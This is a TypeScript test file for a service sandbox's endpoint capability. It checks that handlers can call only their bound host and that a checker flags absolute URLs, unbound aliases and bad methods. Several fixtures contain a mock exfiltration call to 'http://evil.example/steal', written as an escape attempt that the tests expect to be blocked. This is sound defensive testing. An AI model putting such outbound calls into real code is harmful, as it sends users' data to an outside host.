// B120 (slice): a body needs to call an outside API, and `allow net` is a lie
// while the sandbox rejects a bare fetch. The capability is the answer: the
// binding names one base URL, the effect names the path, and the adapter
// refuses anything that would leave the bound host.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { startService, mockHttp } from './harness.ts';
import { CAPABILITIES } from '../src/capabilities.ts';
import { parse } from '../src/parser.ts';
import { check } from '../src/check.ts';

const SPEC = `module hooks @0.1.0 {}

use capability arcod.std.endpoint @1

type Sent = { status: int, body: string }

service Hooks : http {
  uses api: endpoint(url: "http://api.invalid")

  effects {
    allow api.call
  }

  contract {
    public op send(label: string) -> Sent {
      route: "POST /v1/send"
      effects: api.call
    }

    public op escape() -> Sent {
      route: "POST /v1/escape"
      effects: api.call
    }

    public op ghost() -> Sent {
      route: "POST /v1/ghost"
      effects: api.call
    }
  }
}

environment dev {
  bind api -> endpoint(url: "http://api.invalid")
  deploy docker
}
`;

const IMPL = {
  send: `export async function send(input, io) {
  return { result: await io.call("api", "POST", "/v1/hook", { label: input.label }), };
}`,
  escape: `export async function escape(input, io) {
  return { result: await io.call("api", "GET", "http://evil.example/steal", null) };
}`,
  ghost: `export async function ghost(input, io) {
  return { result: await io.call("nope", "GET", "/v1/x", null) };
}`,
};

test('the endpoint signature names one call effect', () => {
  assert.match(CAPABILITIES.endpoint.effects.call, /call\(/);
  assert.match(CAPABILITIES.endpoint.effects.call, /-> \{ status: int, body: string \}/);
});

test('io.call sends the body to the bound host and returns status and text', async () => {
  const api = await mockHttp((req) => ({ status: 200, body: { seen: req.method + ' ' + req.url } }));
  const svc = await startService(SPEC, { impl: IMPL, env: { API_URL: api.base } });
  try {
    const res = await fetch(svc.base + '/v1/send', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ label: 'hello' }),
    });
    const body = await res.json();
    assert.equal(res.status, 201, JSON.stringify(body));
    assert.equal(body.status, 200);
    assert.match(body.body, /"seen":"POST \/v1\/hook"/);
    const call = api.requests.find((req) => req.url === '/v1/hook');
    assert.ok(call, 'the request reached the bound host');
    assert.equal(call.method, 'POST');
    assert.equal(call.body, '{"label":"hello"}');
    assert.match(String(call.headers['content-type']), /application\/json/);
  } finally {
    await svc.stop();
    await api.stop();
  }
});

test('an alias with no binding answers Unavailable', async () => {
  const svc = await startService(SPEC, { impl: IMPL });
  try {
    const res = await fetch(svc.base + '/v1/ghost', { method: 'POST' });
    const body = await res.json();
    assert.equal(res.status, 503, JSON.stringify(body));
    assert.equal(body.error, 'Unavailable');
  } finally {
    await svc.stop();
  }
});

test('a path that leaves the bound host is Forbidden, not a request', async () => {
  const api = await mockHttp(() => ({ status: 200, body: { reached: true } }));
  const svc = await startService(SPEC, { impl: IMPL, env: { API_URL: api.base } });
  try {
    const res = await fetch(svc.base + '/v1/escape', { method: 'POST' });
    const body = await res.json();
    assert.equal(res.status, 403, JSON.stringify(body));
    assert.equal(body.error, 'Forbidden');
    assert.equal(api.requests.length, 0, 'nothing left the service');
  } finally {
    await svc.stop();
    await api.stop();
  }
});

// B120.2: the runtime guarantee is good, but the literal is visible at check
// time: an absolute URL or an unbound alias should be named before the service
// is even built, not discovered as a 403/503 in production.
function endpointDiags(op: string, body: string) {
  return check(parse(SPEC, 'hooks.arc'), { impl: { [op]: body } })
    .filter((d) => d.code === 'W053')
    .map((d) => d.message);
}

test('W053 names an absolute URL in a literal io.call path', () => {
  const found = endpointDiags('send', 'export async function send(input, io) {\n  return { result: await io.call("api", "GET", "http://evil.example/steal", null) };\n}');
  assert.equal(found.length, 1);
  assert.match(found[0], /leaves the bound host/);
  assert.match(found[0], /evil\.example/);
});

test('W053 names an alias the environment does not bind', () => {
  const found = endpointDiags('send', 'export async function send(input, io) {\n  return { result: await io.call("nope", "GET", "/v1/x", null) };\n}');
  assert.equal(found.length, 1);
  assert.match(found[0], /does not bind/);
  assert.match(found[0], /bound: api/);
});

test('W053 stays quiet for a relative path on a bound alias', () => {
  assert.deepEqual(endpointDiags('send', 'export async function send(input, io) {\n  return { result: await io.call("api", "POST", "/v1/hook", { ok: true }) };\n}'), []);
});

test('W053 reads escaped quotes a generated body carries', () => {
  const found = endpointDiags('send', 'export async function send(input, io) {\n  return { result: await io.call(\"api\", \"GET\", \"//evil.example/x\", null) };\n}');
  assert.equal(found.length, 1);
  assert.match(found[0], /leaves the bound host/);
});

test('W053 names a path without a leading slash', () => {
  const found = endpointDiags('send', 'export async function send(input, io) {\n  return { result: await io.call("api", "GET", "v1/hook", null) };\n}');
  assert.equal(found.length, 1);
  assert.match(found[0], /must start with \//);
});

test('W053 names a literal method the adapter does not support', () => {
  const found = endpointDiags('send', 'export async function send(input, io) {\n  return { result: await io.call("api", "FETCH", "/v1/hook", null) };\n}');
  assert.equal(found.length, 1);
  assert.match(found[0], /FETCH/);
  assert.match(found[0], /not supported/);
});
